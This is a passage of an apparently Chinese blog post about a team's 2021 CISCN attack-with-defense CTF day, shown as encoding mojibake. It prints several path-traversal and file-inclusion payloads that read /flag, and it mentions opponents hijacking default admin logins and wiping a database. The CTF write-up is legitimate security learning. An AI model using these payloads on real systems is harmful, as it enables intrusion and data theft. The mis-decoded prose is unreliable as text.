src="/article/2021ciscnawd/image-20210620165959278.png" class="" title="image-20210620165959278" loading="lazy"><p>ä»å·¦åˆ°å³ä¾æ¬¡æ˜¯11-17</p><p>ä¸Šæ¥æˆ‘ä»¬ä¸‰ä½webå¸ˆå‚…é¦–å…ˆä¸‹è½½ssh</p><pre class="language-none"><code class="language-none">safecms --&gt; 172.35.xx.11:80,eyou --&gt; 172.35.xx.12:80,decoder --&gt; 172.35.xx.13:9999,cryptopark --&gt; 172.35.xx.14:9999,eval --&gt; 172.35.xx.15:9999,secgame --&gt; 172.35.xx.16:9999,lol --&gt; 172.35.xx.17:80</code></pre><img src="/article/2021ciscnawd/image-20210620173025274.png" class="" title="image-20210620173025274" loading="lazy"><p>ä¸€çœ‹å°±æ˜¯3webï¼Œ4pwnã€‚å¯¼å…¥å¯†é’¥åå‘ç°æ€ä¹ˆéƒ½è¿ä¸ä¸Šï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œä¸»åŠæ–¹é€šçŸ¥ æœ‰äº›é¶æœºæ²¡æœ‰å¯åŠ¨æˆåŠŸï¼Œæ­£åœ¨å¯åŠ¨ï¼Œæœ‰é—®é¢˜ä¸¾æ‰‹ç¤ºæ„ã€‚ç¦»è°±çš„æ˜¯ï¼Œå¤§å®¶éƒ½æ²¡è¿ä¸Šï¼ŒæŸå­¦æ ¡ç¬¬ä¸€è½®å·²ç»å‘ç°æ¼æ´å¹¶å†™å¥½è„šæœ¬æ‰“äº†å…¨åœºçš„åˆ†ï¼Œç‹¬å é³Œå¤´ã€‚</p><p>ç¬¬ä¸€è½®ç”±äºé¶æœºæœªå¯åŠ¨æˆåŠŸï¼Œæ‰€ä»¥check downäº†ï¼Œæ— è¯­ã€‚</p><img src="/article/2021ciscnawd/image-20210620210522286.png" class="" title="image-20210620210522286" loading="lazy"><h4 id="9-10-ç¬¬2è½®-ç›´æ¥è¿›æ”»"><a href="#9-10-ç¬¬2è½®-ç›´æ¥è¿›æ”»" class="headerlink" title="9:10 - ç¬¬2è½® - ç›´æ¥è¿›æ”»"></a>9:10 - ç¬¬2è½® - ç›´æ¥è¿›æ”»</h4><p>æ—è¾¹webå¸ˆå‚…è¿æ¥æˆåŠŸï¼Œä¸Šå»åé¦–å…ˆæŒ‚äº†logå’Œæ–‡ä»¶ç›‘æ§ï¼Œç„¶åæ‹–ä¸‹æ¥æºç å¼€å§‹æ‰«ã€‚</p><img src="/article/2021ciscnawd/upload_df544a9bb4d1a8a99073e4f878056ce0.png" class="" title="img" loading="lazy"><p>ç›´æ¥å‘ç°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå¦‚ä¸‹</p><img src="/article/2021ciscnawd/image-20210620190953385.png" class="" title="image-20210620190953385" loading="lazy"><p>è°ƒç”¨showæ–¹æ³•ï¼Œç›´æ¥å¯ä»¥æ–‡ä»¶åŒ…å«<code>/flag</code></p><img src="/article/2021ciscnawd/image-20210620191059855.png" class="" title="image-20210620191059855" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;wap&#x2F;Common&#x2F;show?templateFile&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</code></pre><p>å¼€å§‹å†™è„šæœ¬å…¨åœºæ‰“ï¼Œä¹‹å‰é¢„å…ˆå†™å¥½çš„æäº¤flagè„šæœ¬é’ˆå¯¹çš„æ˜¯Dæ®µçš„ï¼Œæ”¹æˆCæ®µæµªè´¹äº†ç‚¹æ—¶é—´ã€‚</p><img src="/article/2021ciscnawd/image-20210620193200148.png" class="" title="image-20210620193200148" loading="lazy"><p>ç„¶åç›´çº¿ä¸Šåˆ†ï¼Œé è¿™ä¸€æ­¥ç¨³æ­¥åœ¨äº†ç¬¬5åã€‚æˆ‘ä»¬å°†æ­¤å¤„è°ƒç”¨ç›´æ¥æ³¨é‡Šï¼ŒæˆåŠŸé˜²å¾¡å’Œcheckã€‚11è¢«æ‰“åˆ°äº†ç¬¬3è½®ã€‚</p><p>æ­¤æ—¶12ï¼Œ13ï¼Œ15è¿˜æ²¡æœ‰äººå‡ºï¼Œæˆ‘ä»¬å¼€å§‹åˆ†ææºç æŒ–æ´ã€‚</p><img src="/article/2021ciscnawd/image-20210622155449870.png" class="" title="image-20210622155449870" loading="lazy"><p>ä¸Šé€šé˜²çš„ç»™é€®åˆ°äº†å§</p><h4 id="9-30å·¦å³-ç¬¬4-5è½®"><a href="#9-30å·¦å³-ç¬¬4-5è½®" class="headerlink" title="9:30å·¦å³ - ç¬¬4-5è½®"></a>9:30å·¦å³ - ç¬¬4-5è½®</h4><p>å‘ç°æˆ‘ä»¬çš„æœåŠ¡ç›´æ¥å°±checkdownäº†ï¼Œç»ç¡®è®¤ï¼Œå‘ç°æ˜¯wafå’Œå¥—å£³çš„åŸå› ï¼Œæˆ‘ä»¬ä¸‹æ‰äº†wafå’Œå£³</p><img src="/article/2021ciscnawd/image-20210620211053690.png" class="" title="image-20210620211053690" loading="lazy"><p>12è¢«æ‰£20åˆ†ï¼Œ15è¢«æ‰£10åˆ†</p><h4 id="9-50å·¦å³-ç¬¬6-9è½®"><a href="#9-50å·¦å³-ç¬¬6-9è½®" class="headerlink" title="9:50å·¦å³ - ç¬¬6-9è½®"></a>9:50å·¦å³ - ç¬¬6-9è½®</h4><img src="/article/2021ciscnawd/image-20210620212448430.png" class="" title="down" loading="lazy"><p>å‘ç°12å¤§é‡å®•æœºï¼Œè­¦æƒ•</p><p>ç¬¬9è½®ï¼Œè¿›åˆ°äº†ç¬¬ä¸‰å</p><img src="/article/2021ciscnawd/image-20210620212907416.png" class="" title="image-20210620212907416" loading="lazy"><h4 id="10-30å·¦å³-ç¬¬10è½®-pwné¢˜ä¸€è¡€"><a href="#10-30å·¦å³-ç¬¬10è½®-pwné¢˜ä¸€è¡€" class="headerlink" title="10:30å·¦å³ - ç¬¬10è½® - pwné¢˜ä¸€è¡€"></a>10:30å·¦å³ - ç¬¬10è½® - pwné¢˜ä¸€è¡€</h4><img src="/article/2021ciscnawd/image-20210620213129362.png" class="" title="image-20210620213129362" loading="lazy"><p>pwnå…¨åœºè¢«æ”»å‡»ï¼Œå¼€å§‹åˆ†ææµé‡</p><img src="/article/2021ciscnawd/image-20210620213518653.png" class="" title="image-20210620213518653" loading="lazy"><p>pwnçˆ·åœ¨åŠªåŠ›å¤ç°</p><p>ç¬¬11è½®ï¼Œ<code>TimeKeeper</code>ç›´æ¥å‡­å€Ÿä¸€é¢˜ä¸Šäº†è¿‘700åˆ†ï¼Œæ‰“åˆ°äº†ç¬¬äºŒï¼Œæˆ‘ä»¬åˆ°äº†ç¬¬å››</p><img src="/article/2021ciscnawd/image-20210622133401466.png" class="" title="image-20210622133401466" loading="lazy"><p>pwnçˆ·æœ¬åœ°å¥—å£³å°è¯•ï¼Œå‘ç°æœ¬åœ°å¯ä»¥ï¼Œé¶æœºä¸è¡Œã€‚æ­¤æ—¶å•†é‡å¯¹ç­–ï¼Œç”±äºæˆ‘ä»¬æ’åè¾ƒä¸ºé å‰ï¼Œä¸ºå‡å°‘å·®è·ï¼Œæˆ‘ä»¬å†³å®šå®•æœºã€‚è¿™æ ·å®•æœºæ‰£10åˆ†ç»™å…¨åœºï¼Œè¢«æ‰“æ‰£10åˆ†ç»™æ‰“çš„äººï¼Œä¸å¦‚ç»™å…¨åœºï¼Œäºæ˜¯å†³å®šè‡ªè¡Œå®•æœºã€‚</p><img src="/article/2021ciscnawd/image-20210622133745484.png" class="" title="image-20210622133745484" loading="lazy"><p>pwnçˆ·é‡æ”¾å¤±è´¥ï¼Œè§‰å¾—æ˜¯æ–¹å¼é—®é¢˜ï¼Œæˆ‘ä»¬è®©ä»–ç¨³ä½ï¼Œæ…¢æ…¢æ£€æŸ¥ã€‚</p><h4 id="11-20å·¦å³-ç¬¬15è½®"><a href="#11-20å·¦å³-ç¬¬15è½®" class="headerlink" title="11:20å·¦å³ - ç¬¬15è½®"></a>11:20å·¦å³ - ç¬¬15è½®</h4><p>13è¢«æ”»å‡»</p><img src="/article/2021ciscnawd/image-20210622133904810.png" class="" title="image-20210622133904810" loading="lazy"><p>ç”±äºéƒ¨åˆ†é˜Ÿä¼é‡æ”¾æˆåŠŸï¼Œæˆ‘ä»¬æ‰åˆ°äº†ç¬¬7ã€‚æˆ‘ä»¬é¼“åŠ±pwnå¸ˆå‚…ä¼˜å…ˆé‡æ”¾ï¼Œæš‚æ—¶ä¸ç”¨ä¿®ã€‚</p><p>åŒæ—¶æˆ‘å¸®å¿™æ£€æŸ¥äº†æµé‡</p><img src="/article/2021ciscnawd/image-20210622134327938.png" class="" title="image-20210622134327938" loading="lazy"><p>æ€€ç–‘æ˜¯æ··æ·†æµé‡ï¼Œæœ€åè¯å®ä¸éœ€è¦è¿™ä¹ˆå¤æ‚ã€‚å½“æ—¶è®©pwnå¸ˆå‚…å…ˆä¿å­˜ï¼Œä¼˜å…ˆçœ‹15.</p><h4 id="11-40-ç¬¬17è½®-è¢«äººå…³ç«™"><a href="#11-40-ç¬¬17è½®-è¢«äººå…³ç«™" class="headerlink" title="11:40 - ç¬¬17è½® - è¢«äººå…³ç«™"></a>11:40 - ç¬¬17è½® - è¢«äººå…³ç«™</h4><p>ï¼ˆä¸»åŠæ–¹é€é¥­æ¥äº†ï¼‰</p><p>çªå‘çŠ¶å†µï¼Œweb2å¤§é‡å®•æœºã€‚å‘ç°ç½‘ç«™è¢«äººå…³é—­äº†ã€‚ç»ä¸»åŠæ–¹æé†’ï¼Œweb2æœ‰åå°ç®¡ç†ï¼Œå¯†ç é»˜è®¤ï¼Œè¢«äººæ‰¹é‡æ”¹äº†å¯†ç ç™»é™†åå°å…³é—­äº†ç½‘ç«™ã€‚ç½‘ç«™æ˜¾ç¤º<code>ç½‘ç«™æš‚æ—¶å…³é—­ï¼Œç»´æŠ¤ä¸­â€¦â€¦</code></p><p>é»‘ï¼ŒçœŸtmçš„é»‘å•Šã€‚</p><p>è¿˜å¥½ç½‘ç«™æœ‰å¤‡ä»½ï¼Œå°è¯•å¤åŸï¼Œå‘ç°æ— æ³•å¤åŸï¼Œæ²¡æœ‰æƒé™ã€‚</p><p>ä½†æ˜¯æ•°æ®åº“è¿˜åœ¨ï¼Œå°è¯•ä¿®æ”¹æ•°æ®åº“é‡Œçš„adminå¯†ç ï¼Œå‘ç°æ˜¯md5ï¼Œç”Ÿæˆåå‘ç°ä¸å¯¹ï¼Œå¯†ç åº”è¯¥æ˜¯åŠ ç›äº†</p><p><strong>å„æ–¹å°è¯•åï¼Œåœ¨11:45å·¦å³ï¼Œæˆ‘ä»¬å‘ä¸»åŠæ–¹ç”³è¯·äº†é‡ç½®é¶æœº12ã€‚</strong></p><p>é‡ç½®å®Œæˆåç«‹åˆ»ç™»é™†ï¼Œå¯æ˜¯äººå®¶å†™å¥½äº†æ‰¹é‡æ”»å‡»è„šæœ¬ï¼Œæˆ‘ä»¬æ²¡äººå®¶å¿«</p><img src="/article/2021ciscnawd/image-20210622135940583.png" class="" title="image-20210622135940583" loading="lazy"><p>è¿™æ—¶å€™çªå‘å¥‡æƒ³ï¼Œæœç´¢æºç </p><img src="/article/2021ciscnawd/image-20210622140242016.png" class="" title="image-20210622140242016" loading="lazy"><p>æ—¢ç„¶è¿™æœ‰åˆ¤æ–­ï¼Œé‚£å°±å¹²è„†å…¨éƒ¨æ³¨é‡Šï¼Œæˆ–è€…æŠŠ<code>0</code>æ”¹æˆ<code>1</code></p><img src="/article/2021ciscnawd/image-20210622140326152.png" class="" title="image-20210622140326152" loading="lazy"><p>ç½‘ç«™æ¢å¤äº†ï¼Œä½†è¿™æ¬¡å¤„ç†è€—è´¹äº†å¤§é‡æ—¶é—´ï¼Œæˆ‘ä»¬å·²ç»å¼€å§‹ä¹±äº†é˜µè„š</p><p>æ­¤æ—¶pwnå¸ˆå‚…é‚£å†³å®š13ä¹Ÿè‡ªè¡Œå®•æœºã€‚</p><h4 id="12-00-ç¬¬19è½®-ä¿®å¤12"><a href="#12-00-ç¬¬19è½®-ä¿®å¤12" class="headerlink" title="12:00 - ç¬¬19è½® - ä¿®å¤12"></a>12:00 - ç¬¬19è½® - ä¿®å¤12</h4><p>å±æœºè¿˜æœªè§£é™¤ï¼Œæˆ‘ä»¬å‘ç°12è¿˜æ˜¯checkdownçš„çŠ¶æ€</p><p>åŒæ—¶12ç‚¹ä¸Šäº†æ–°é¢˜ï¼Œåˆ·æ–°å‘ç°ï¼Œä¸Šäº†ä¸¤é“pwné¢˜ï¼Œpwnå¸ˆå‚…ç›´æ¥ç˜«å€’åœ¨äº†æ¤…å­ä¸Šï¼Œæˆ‘ä»¬ä¸‰ä¸ªwebå¿ƒé‡Œå‡‰äº†ä¸€æˆªï¼Œå·²ç»è®¤å®šæœ¬æ¬¡æ¯”èµ›æˆ‘ä»¬åŸºæœ¬ä¸Šå·²ç»è¾“äº†ã€‚ï¼ˆæ­¤æ—¶è¦æ˜¯ä¸Š1web1pwnä¹Ÿè®¸è¿˜æœ‰æœºä¼šï¼Œå¯æ˜¯ä¸Šäº†2pwné¢˜ï¼‰</p><p>pwnå¸ˆå‚…æ­¤æ—¶å‘ç°ä¸ä¼šé‡æ”¾æµé‡ï¼Œæ„å‘³ç€æˆ‘ä»¬pwné¢˜æ²¡æœ‰è¾“å‡ºäº†ï¼ŒåŒæ—¶å°è¯•ä¿®å¤ï¼Œå‘ç°ä¿®å¤å°±checkdownï¼Œæ„å‘³ç€æˆ‘ä»¬ç°åœ¨2web4pwnï¼Œ4pwnå®Œå…¨å°±æ˜¯é€åˆ†çš„çŠ¶æ€ï¼ŒåŸºæœ¬ä¸Šç»“å±€å·²å®šã€‚</p><p>11/12ä¸ºwebï¼Œ13/15ä¸ºpwnï¼Œ14/16ä¸ºæ–°ä¸Šçš„pwn</p><img src="/article/2021ciscnawd/image-20210622142809731.png" class="" title="image-20210622142809731" loading="lazy"><p>æˆ‘ä»¬è®©pwnå¸ˆå‚…ç¨³ä½ï¼Œä¸ç®¡ç»“æœå¦‚ä½•æˆ‘ä»¬ä¸€èµ·æ¥å—ï¼Œæ­¤æ—¶å¤§å®¶éƒ½å¿ƒçŸ¥è‚šæ˜ï¼Œå¯æ˜¯æ²¡äººæ•¢ç‚¹ç ´â€¦</p><p><strong>å³ä½¿æ³¨å®šå¤±è´¥ï¼Œæˆ‘ä»¬ä¹Ÿå¾—æˆ˜åˆ°æœ€å</strong></p><p>ç›®å‰webä»»åŠ¡ï¼šä¿®å¤å¥½12</p><p>æˆ‘å»å®¡è®¡ä»£ç </p><img src="/article/2021ciscnawd/image-20210620174753069.png" class="" title="image-20210620174753069" loading="lazy"><p>æ‰¾åˆ°äº†Adminåå°è·¯ç”±ä¸º<code>/Admin/login</code>ï¼ˆå…¶å®å®¡æµé‡èƒ½çœ‹åˆ°ï¼Œå¯æ˜¯è¢«äººæ‰“äº†æ··æ·†å¤ªæ¶å¿ƒäº†ï¼‰</p><img src="/article/2021ciscnawd/image-20210622141935947.png" class="" title="image-20210622141935947" loading="lazy"><p>åœ¨<code>application/admin/controller/Admin.php</code>ä¸‹å‘ç°éªŒè¯æ–¹å¼</p><img src="/article/2021ciscnawd/image-20210622142119360.png" class="" title="image-20210622142119360" loading="lazy"><p>è·Ÿè¿›<code>func_encrypt</code>çœ‹ï¼Œå‘ç°ç¡®å®åŠ ç›äº†ï¼Œç°åœ¨è¦æ‰¾åˆ°ä½ç½®ï¼Œç»§ç»­è·Ÿè¿›</p><img src="/article/2021ciscnawd/image-20210622142205443.png" class="" title="image-20210622142205443" loading="lazy"><p>å‘ç°åº”è¯¥å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œå¹¸äºæ•°æ®åº“æœªè¢«æ”¹å¯†ç </p><img src="/article/2021ciscnawd/image-20210622142403373.png" class="" title="image-20210622142403373" loading="lazy"><p>åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°ç›</p><img src="/article/2021ciscnawd/image-20210622142613420.png" class="" title="image-20210622142613420" loading="lazy"><p>updateä¸€ä¸‹adminçš„å¯†ç ï¼ŒæˆåŠŸä¿®æ”¹æˆåŠŸï¼ŒæŠŠç½‘ç«™æ¢å¤æ­£å¸¸äº†ã€‚</p><img src="/article/2021ciscnawd/image-20210622155405384.png" class="" title="image-20210622155405384" loading="lazy"><h4 id="12-20-ç¬¬21è½®"><a href="#12-20-ç¬¬21è½®" class="headerlink" title="12:20 - ç¬¬21è½®"></a>12:20 - ç¬¬21è½®</h4><p>æˆ‘ä»¬æ‰åˆ°äº†17å</p><p>æ­¤æ—¶æ–°ä¸Šçš„14ç›´æ¥è¢«äººaæ‰äº†ï¼Œä¸è¿‡æ˜¯è¯•æ¢æ€§çš„æ‰“äº†ä¸¤ä¸ªé˜Ÿï¼Œä¸‹ä¸€è½®å°±è¦å…¨åœºæ‰“äº†</p><img src="/article/2021ciscnawd/image-20210622143135148.png" class="" title="image-20210622143135148" loading="lazy"><img src="/article/2021ciscnawd/image-20210622143251871.png" class="" title="image-20210622143251871" loading="lazy"><h4 id="13-00-ç¬¬25è½®"><a href="#13-00-ç¬¬25è½®" class="headerlink" title="13:00 - ç¬¬25è½®"></a>13:00 - ç¬¬25è½®</h4><p>ï¼ˆä¸»åŠæ–¹æç¤ºé¥­å‡‰äº†ï¼Œæˆ‘ä»¬è¿˜æ²¡åŠ¨è¿‡æ—è¾¹çš„é¥­ï¼‰</p><p>æ­¤æ—¶æ‰åˆ°äº†26å</p><p>æˆ‘å®¡è®¡14çš„æµé‡ï¼Œå‘ç°æµé‡å¾ˆç®€å•ï¼Œæ²¡æœ‰åœ°å€ç‰¹æ®Šå­—ç¬¦ç­‰ç­‰</p><img src="/article/2021ciscnawd/image-20210622143728983.png" class="" title="image-20210622143728983" loading="lazy"><p>æˆ‘å«pwnå¸ˆå‚…å…ˆçœ‹è¿™é¢˜ï¼Œæ­¤æ—¶pwnå¸ˆå‚…ç¥æƒ…ææƒš</p><h4 id="14-00-ç¬¬31è½®"><a href="#14-00-ç¬¬31è½®" class="headerlink" title="14:00 - ç¬¬31è½®"></a>14:00 - ç¬¬31è½®</h4><p>æ­¤æ—¶16è¢«äººè§£å‡ºï¼Œæˆ‘ä»¬æ‰åˆ°äº†30å</p><img src="/article/2021ciscnawd/image-20210622144130081.png" class="" title="image-20210622144130081" loading="lazy"><p>pwnå¸ˆå‚…å°è¯•ä¿®å¤14ï¼Œè¢«checkdownå¹¶è¢«æ”»å‡»</p><h4 id="14-20-ç¬¬33è½®-pwné‡æ”¾æˆåŠŸ"><a href="#14-20-ç¬¬33è½®-pwné‡æ”¾æˆåŠŸ" class="headerlink" title="14:20 - ç¬¬33è½® - pwné‡æ”¾æˆåŠŸ"></a>14:20 - ç¬¬33è½® - pwné‡æ”¾æˆåŠŸ</h4><p>pwnå¸ˆå‚…é‡æ”¾14æˆåŠŸï¼</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>å¼€å§‹å‡†å¤‡æ‰¹é‡æ‰“ï¼Œè¿™æ—¶å‘ç°æ‰¹é‡æ‰“è„šæœ¬æœ‰é—®é¢˜ï¼Œæ— æ³•ç»“æŸè¿æ¥ã€‚æ— å¥ˆæœ€åæˆ‘ä»¬å…¨éƒ¨æ‰‹äº¤14çš„flagä¸€ç›´äº¤åˆ°æ¯”èµ›ç»“æŸï¼Œä¸­é—´é—æ¼äº†ä¸å°‘</p><h4 id="15-00-ç¬¬37è½®-æ–°é¢˜ä¸Šåœº"><a href="#15-00-ç¬¬37è½®-æ–°é¢˜ä¸Šåœº" class="headerlink" title="15:00 - ç¬¬37è½® - æ–°é¢˜ä¸Šåœº"></a>15:00 - ç¬¬37è½® - æ–°é¢˜ä¸Šåœº</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12å…¨downäº†ï¼Œ16pwnå¸ˆå‚…è¿˜æ˜¯è‡ªè¡Œå®•æœº</p><p>æ­¤æ—¶ä¸Šäº†æ–°é¢˜ï¼Œä¸€é“ç®€å•webï¼Œæˆ‘ä»¬å†³å®šåŠªåŠ›ä¸€ä¸‹</p><p>ç›´æ¥å‘ç°æ–‡ä»¶åŒ…å«æ¼æ´</p><p><code>./statics/1.php?file=/flag</code></p><p>é‡Œé¢æ˜¯ä¸ªfile_get_contentsï¼Œç›´æ¥åˆ é™¤ï¼Œæˆ‘ç«‹åˆ»å†™è„šæœ¬å¼€å§‹å…¨åœºæ‰“</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>é¢˜ç›®åˆšä¸Šæ¥ä¸€è½®å°±æ”»å‡»æˆåŠŸï¼Œä¹Ÿæœ‰å…¶ä»–é˜Ÿå‘ç°äº†æ¼æ´ï¼Œå’Œæˆ‘ä»¬å¹³åˆ†äº†åˆ†æ•°</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>è¿™ä¸€æ³¢çš„ååº”æå…¶è¿…é€Ÿï¼Œå¯æ˜¯è¿˜æ˜¯æ— æ³•å¼¥è¡¥å‰é¢çš„å·®è·ã€‚ä½†æˆ‘ä»¬ä¸æƒ³æ”¾å¼ƒã€‚</p><p>å†³å®šä¸€ä½webå¸ˆå‚…ç»§ç»­å®¡è®¡17ï¼Œå¦å¤–çš„å¸ˆå‚…ä¿®11/12ï¼Œæˆ‘ç»§ç»­å®¡è®¡æµé‡ã€‚</p><h4 id="15-20-ç¬¬39è½®-å†å‡ºä¸€æ´"><a href="#15-20-ç¬¬39è½®-å†å‡ºä¸€æ´" class="headerlink" title="15:20 - ç¬¬39è½® - å†å‡ºä¸€æ´"></a>15:20 - ç¬¬39è½® - å†å‡ºä¸€æ´</h4><p>å®¡è®¡å‘ç°äº†17ç¬¬äºŒä¸ªæ´å¦‚ä¸‹</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>ä¸11æ¨¡ç‰ˆç›¸ä¼¼ï¼Œç›´æ¥å†™è„šæœ¬å†æ‰“</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>ä¿®å¤æ–¹æ³•ç›´æ¥æ³¨é‡Š</p><h4 id="15-50-ç¬¬42è½®-é’ˆå¯¹check"><a href="#15-50-ç¬¬42è½®-é’ˆå¯¹check" class="headerlink" title="15:50 - ç¬¬42è½® - é’ˆå¯¹check"></a>15:50 - ç¬¬42è½® - é’ˆå¯¹check</h4><p>12ç½‘ç«™æ­£å¸¸å´checkdownï¼Œå‘ç°æ•°æ®åº“ç»™äººåˆ äº†ï¼Œå¬è¯´æ˜¯sqlæ³¨å…¥æ‰‹æ³¨ç»™äººåˆ äº†åº“ï¼Œæˆ‘ä»¬ä»…å‰©ä¸€æ¬¡é‡ç½®æœºä¼šï¼Œå†µä¸”11ç°åœ¨è¿˜åœ¨å®•æœºæ‰¾ä¸åˆ°åŸå› ã€‚</p><p>é˜Ÿé‡Œå¸ˆå‚…çµæœºä¸€åŠ¨å¼€å§‹åˆ†æï¼Œæˆ‘ä»¬å‘ç°checkæµé‡æ˜¯ç™»é™†éšæœºç”¨æˆ·ï¼Œç”¨æˆ·åå¯†ç éƒ½æ˜¯é”™çš„ï¼ŒéªŒè¯ç ä¸å¯èƒ½æ™ºèƒ½åˆ°åˆ†æéªŒè¯ç å§</p><p>æ¥è‡ª10.10.10.10çš„checkæµé‡</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>ç°åœ¨ç™»é™†ä¼šæ˜¾ç¤ºæ•°æ®åº“é”™è¯¯ï¼Œé‚£å°±å…¨å±€æœç´¢ï¼ŒæŠŠ<code>æ•°æ®åº“é”™è¯¯</code>æ”¹æˆäº†<code>éªŒè¯ç é”™è¯¯</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-ç¬¬43è½®"><a href="#16-00-ç¬¬43è½®" class="headerlink" title="16:00 - ç¬¬43è½®"></a>16:00 - ç¬¬43è½®</h4><p>pwnå¸ˆå‚…å°è¯•ä¿®å¤14è¢«checkdownå¹¶è¢«æ”»å‡»</p><p>11ç»ç¡®è®¤è¢«äººå†™ç äº†ï¼Œå ç”¨èµ„æºç–¯ç‹‚å†™ç¼“å­˜</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>å®åœ¨æ˜¯ä¸çŸ¥é“æ€ä¹ˆåŠï¼Œå¦‚æœé‡ç½®çš„è¯åˆä¼šè¢«æ‰“ã€‚</p><p>pwnå¸ˆå‚…è¯´ä»–ç´¯äº†ï¼Œæ‰‹ äº¤ è¦æ´—å†…äº†</p><h4 id="16-30-ç¬¬46è½®-æ–°çš„0day"><a href="#16-30-ç¬¬46è½®-æ–°çš„0day" class="headerlink" title="16:30 - ç¬¬46è½® - æ–°çš„0day"></a>16:30 - ç¬¬46è½® - æ–°çš„0day</h4><p>12çªç„¶æŠ¥åˆè¢«æ‰“äº†ï¼Œç«‹åˆ»æŸ¥æµé‡</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>ç„¶åä¸€åˆ·æ–°ä¸»é¡µå‘ç°flagå°±åœ¨ä¸»é¡µ</p><p>å’±ä»¬å°±ä¹Ÿå†™ï¼Œå¤ç°æˆåŠŸ</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>æœ€åä¸€å¥è¯æ²¡å†™è¿›å»ï¼Œä¸çŸ¥é“ä¸ºå•¥</p><p>ä¿®å¤å°±å†ç¼–è¾‘ä¸‹æŠŠè‡ªå·±çš„ä¸»é¡µæ¢å¤å°±è¡Œã€‚å‰ç«¯rceï¼Œæ”¶è·0dayä¸€ä¸ª</p><p>ç¬¬47è½®æƒ¨çŠ¶ç•™å¿µ</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-ç¬¬49è½®"><a href="#17-00-ç¬¬49è½®" class="headerlink" title="17:00 - ç¬¬49è½®"></a>17:00 - ç¬¬49è½®</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwnå¸ˆå‚…è¯´ä»–çœŸçš„ç´¯äº†ï¼Œç»™pwnå¸ˆå‚…å†™äº†ä¸ªä¸€é”®æäº¤ï¼Œè®©ä»–ç¨å¾®è½»æ¾ä¸€ç‚¹</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-ç¬¬52è½®-å¤åŸpwné¢˜"><a href="#17-30-ç¬¬52è½®-å¤åŸpwné¢˜" class="headerlink" title="17:30 - ç¬¬52è½® - å¤åŸpwné¢˜"></a>17:30 - ç¬¬52è½® - å¤åŸpwné¢˜</h4><p>æ¯”èµ›è¿˜å‰©ä¸€ä¸ªå°æ—¶ï¼Œpwnå¸ˆå‚…å°†pwné¢˜å…¨éƒ¨å¤åŸäº†</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11ä¸å‡†å¤‡ä¿®äº†ï¼Œä¸å‡†å¤‡é‡ç½®äº†ï¼Œèººå¹³äº†ã€‚</p><p>å’±å¼€äº†31ä¸ªshellå¸®pwnå¸ˆå‚…ä¸€èµ·äº¤flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-ç¬¬56è½®"><a href="#18-10-ç¬¬56è½®" class="headerlink" title="18:10 - ç¬¬56è½®"></a>18:10 - ç¬¬56è½®</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" loading="lazy"><p>å’±17ä»3:00åˆšä¸Šåˆ°æœ€åæ²¡è¢«æ‰“ä¸€æ¬¡ï¼Œè€Œä¸”åˆšä¸Šå°±ä¸€ç›´åœ¨æ‰“åˆ«äººï¼Œç®—æ˜¯å°å°çš„æ¬£æ…°å§ã€‚</p><h4 id="18-30-ç¬¬57è½®-æ¯”èµ›ç»“æŸ"><a href="#18-30-ç¬¬57è½®-æ¯”èµ›ç»“æŸ" class="headerlink" title="18:30 - ç¬¬57è½® - æ¯”èµ›ç»“æŸ"></a>18:30 - ç¬¬57è½® - æ¯”èµ›ç»“æŸ</h4><p>æœ€ç»ˆè®°å½•</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>é¥­éƒ½å‡‰äº†ï¼Œä¸€å¤©æ²¡åƒä¸œè¥¿</p><hr><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç»“æŸååˆç…§éƒ½æ²¡æœ‰ï¼Œæˆ‘ä»¬2åªé˜Ÿç›´æ¥ç¦»å¼€äº†èµ›åœºã€‚</p><p>è¿™æ˜¯5ä½å¤§ä¸‰å¸ˆå‚…ä»¬æœ€åä¸€æ¬¡æ¯”èµ›äº†å¯èƒ½ã€‚</p><p>å¤§äºŒæˆ‘æ˜¯webï¼Œä¸¤ä½æ˜¯pwnï¼Œä¸€ä½å‡†å¤‡è€ƒç ”å»ä¸æƒ³æ‰“ctfäº†ï¼Œå¦ä¸€ä½å¾ˆè‡ªè´£</p><p>é‚£ä½pwnå¸ˆå‚…å›æ 